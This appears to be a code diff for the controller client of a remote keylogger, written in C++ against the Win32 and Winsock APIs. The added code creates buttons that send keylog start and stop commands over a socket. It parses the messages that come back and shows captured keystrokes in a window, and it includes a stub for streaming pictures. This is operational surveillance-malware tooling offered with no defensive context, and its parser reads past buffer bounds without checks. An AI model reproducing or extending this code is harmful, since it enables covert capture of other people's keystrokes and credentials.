@@ -3,26 +3,30 @@
 
 
 
+map<string, CLIENT_MESSAGES> MESSAGEMAP;
 
-
-//convert a string to float
+struct sockaddr_in clientsocket;
+SOCKET sa;
+stringstream KEYLOG_STREAM;
+char client_buffer[BUFFER_SZ];
+string client_operator, client_operand;
+string keylog = "Keylog window:\nfdf";
 
 /*  Make the class name into a global variable  */
 char szClassName[ ] = "KeyClient";
 HWND g_hToolbar = NULL;
 
-           struct sockaddr_in clientsocket;
-           SOCKET sa;
-           stringstream KEYLOG_STREAM;
-           char server_buffer[5000];
 
 int WINAPI WinMain (HINSTANCE hThisInstance,
                      HINSTANCE hPrevInstance,
                      LPSTR lpszArgument,
                      int nCmdShow)
 {
-    /*INITIALIZE WINSOCK*/
 
+    MESSAGEMAP["KEYLOG"] = KEYLOG;
+    MESSAGEMAP["STREAMPICTURE"] = STREAMPICTURE;
+
+    /*INITIALIZE WINSOCK*/
     WSADATA wsa;
 
           if (WSAStartup(MAKEWORD(2,2), &wsa)!=0)  {
@@ -112,6 +116,8 @@ LRESULT CALLBACK WindowProcedure (HWND hwnd, UINT message, WPARAM wParam, LPARAM
             CreateWindowEx(NULL, "BUTTON", "Disconnect", WS_TABSTOP|WS_VISIBLE|WS_CHILD|BS_DEFPUSHBUTTON, 460, 300, 150, 24, hwnd, HMENU(DISCONNECT_HOST), hInstance, NULL);
             CreateWindowEx(NULL, "STATIC", "Status: Client Initialized! No errors so far!", WS_CHILD|WS_VISIBLE|SS_SUNKEN,25, 330, 585, 18, hwnd, HMENU(STATIC_STATUS_TEXT), hInstance, NULL);
             CreateWindowEx(NULL, "EDIT", "Keylog Window: ", WS_CHILD|WS_VISIBLE|ES_READONLY|ES_MULTILINE|WS_VSCROLL, 25, 350, 585, 65, hwnd, HMENU(KEYLOG_WINDOW), hInstance, NULL);
+            CreateWindowEx(NULL, "button", "Keylogger On", WS_VISIBLE | WS_CHILD | BS_RADIOBUTTON, 25, 420, 115, 15, hwnd, HMENU(CHK_KEYLOG), hInstance, NULL);
+            CreateWindowEx(NULL, "button", "Keylogger Off", WS_VISIBLE | WS_CHILD | BS_RADIOBUTTON, 145, 420, 120, 15, hwnd, HMENU(UNCHK_KEYLOG), hInstance, NULL);
         }
         break;
 
@@ -130,17 +136,52 @@ LRESULT CALLBACK WindowProcedure (HWND hwnd, UINT message, WPARAM wParam, LPARAM
                 break;
                 case FD_READ:{
 
+
+
                     //HINT HINT, Since the keylogger feature isnt implemented. Guess what? Implement it here.
                     //Whenever the server gets a read message, parse the message into a operator/operand like the server
                     //if the operator is  of Keylog or KG or whatever, then process it in a way which sends it to our KEY_LOG WINDOW
                     //That way we can differentiate between statuses and Keylogwindow!
                     //You can add other ways in which the server sends messages to client.
                     //This can be a great chat client as well!
-                            memset(&server_buffer[0], '\0', sizeof(server_buffer));
-                         //KEYLOG_STREAM << server_reply[]
+                    client_operator = "", client_operand = "";
+
+                        memset(&client_buffer[0], '\0', BUFFER_SZ);
+                        HandleError(recv(sa, client_buffer,  BUFFER_SZ, NULL));
+
+                         int forcount = 0;
+                         for (; client_buffer[forcount] != '>'; forcount++){
+                            client_operator += client_buffer[forcount];
+                         }
+
+                            //PARSE THE OPERAND
+                        forcount++;
+                        for (; client_buffer[forcount] != '<'; forcount++){
+                            client_operand += client_buffer[forcount];
+                        }
+
+                        map<string, CLIENT_MESSAGES>::iterator i = MESSAGEMAP.find(client_operator);
+
+
+                        switch(i->second){
+
+                            case KEYLOG: {
+
+                                keylog.append(client_operand);
+                                //std::cout <<"\n" <<keylog;
+                                SetDlgItemText(hwnd, KEYLOG_WINDOW, keylog.c_str());
+                            }
+                            break;
+
+                            case STREAMPICTURE: //pic
+                            break;
+
+                            default: SetDlgItemText(hwnd, STATIC_STATUS_TEXT, "Status: Message from server not recognized!");
+                        }
+
                         SetDlgItemText(hwnd, STATIC_STATUS_TEXT, "Status: Server processed message and executed!");
 
-                        SetDlgItemText(hwnd, KEYLOG_WINDOW, "Keylog Window: ");
+                        //SetDlgItemText(hwnd, KEYLOG_WINDOW, "Keylog Window: ");
 
                 }
                 break;
@@ -152,13 +193,33 @@ LRESULT CALLBACK WindowProcedure (HWND hwnd, UINT message, WPARAM wParam, LPARAM
         case WM_COMMAND:
 
             switch(LOWORD(wParam)){
+                case CHK_KEYLOG:{
+                    CheckDlgButton(hwnd, CHK_KEYLOG, BST_CHECKED);
+                    CheckDlgButton(hwnd, UNCHK_KEYLOG, BST_UNCHECKED);
+
+                    HandleError(send(sa, "KEYLOG><", 8, 0));
+                    //MessageBox(NULL, "Keylog", NULL, NULL);
+
+                }
+                break;
+
+                case UNCHK_KEYLOG:{
+                    CheckDlgButton(hwnd, UNCHK_KEYLOG, BST_CHECKED);
+                    CheckDlgButton(hwnd, CHK_KEYLOG, BST_UNCHECKED);
+                    //MessageBox(NULL, "stop Keylog", NULL, NULL);
+
+                    HandleError(send(sa, "KEYLOGSTOP><", 13, 0));
+
+                }
+                break;
 
                 case MAIN_WINDOW_BUTTONMSG1:{
                     DialogBox(GetModuleHandle(NULL), MAKEINTRESOURCE(IDD_MSGBOXTRIG), hwnd, MsgBoxTrigger);
                 }break;
 
                 case DISCONNECT_HOST:{
-
+                    HandleError(send(sa, "DISCONNECT><", 11, 0));
+                    Sleep(1000);
                     HandleError(closesocket(sa));
                     MessageBox(NULL, "Disconnected from client!", "Socket Disconnected!", MB_OK | MB_ICONINFORMATION);
 
@@ -196,9 +257,9 @@ LRESULT CALLBACK WindowProcedure (HWND hwnd, UINT message, WPARAM wParam, LPARAM
                             break;
                         }else MessageBox(NULL, "Success! Client connected successfully!", "Success!", MB_OK | MB_ICONINFORMATION);
 
-                        //char server_buffer[500];
+                        //char client_buffer[500];
 
-                        //recv(sa, server_buffer, 500, 0);
+                        //recv(sa, client_buffer, 500, 0);
 
                         //send(sa, "MESSAGE2>", 20, 0);
 
